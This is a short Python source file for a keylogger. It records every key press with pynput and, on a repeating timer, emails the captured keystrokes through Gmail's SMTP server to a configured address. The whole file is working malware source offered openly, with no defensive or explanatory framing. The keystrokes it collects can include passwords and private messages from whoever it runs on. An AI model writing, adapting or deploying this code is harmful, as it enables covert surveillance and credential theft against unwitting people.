#!/usr/bin/python

import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
        keybourd_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keybourd_listener:
            self.report()
            keybourd_listener.join()

    def process_key_press(self, key):
        # global log
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            else:
                self.log = self.log + " " + str(key) + " "
        # print(log)

    def report(self):
        # global log
        # print(self.log)
        if self.log != "":
            self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
